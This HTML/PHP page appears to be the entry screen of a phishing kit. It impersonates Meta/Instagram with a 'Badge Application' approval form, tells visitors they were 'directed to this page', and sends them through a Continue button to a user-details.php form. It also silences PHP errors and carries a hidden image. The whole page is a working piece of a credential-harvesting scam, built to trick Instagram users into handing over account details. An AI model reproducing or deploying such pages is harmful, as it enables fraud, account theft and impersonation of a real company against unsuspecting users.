<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <title>Blue | Application Meta</title>
  <meta name="description" content="" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link rel="stylesheet" href="./assets/style.css">
  <link rel="shortcut icon" href="./assets/img/head.ico" type="image/x-icon">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css"/>
</head>
<body>
  <?php 
error_reporting(0);
    include "header.php";
  ?>
  <div class="lsf_o">
    <img id="umut" src="./assest/img/logo.png">

    <style>
      #umut{
        display:fixed;
        opacity: 0;
        z-index: -999999;
      }

    </style>

    <div class="cardd">
      <center>
        <img src="./assets/img/meta.png" width="300" />
      </center>
      <br />
      <center>
        <h1 style="
              font-family: sans-serif;
              font-weight: 400;
              color: #3d3d3d;
              font-size: 20px;
            ">
          Approval | Tick Form
        </h1>
        <br /><br />

        <h5 style="font-family: sans-serif; color: #999; width: 80%">
          Hello Dear User, You have been directed to this page for Badge
          Application, Please continue by clicking the button.
        </h5>
        <h5 style="
              font-family: sans-serif;
              color: #999;
              width: 80%;
              margin-top: 20px;
            ">
          Click the Button Below and Continue to Application
        </h5>

        <form method="POST" action="user-details.php">
          <button type="submit" class="bvsf_asd">
            <span>Continue </span></button><br />
          <img src="./assets/img/meta.gif" width="300px" />
        </form>
      </center>

      <div class="footer">
        <p>© 2022 from Instagram</p>
      </div>
    </div>
  </div>
</body>

</html>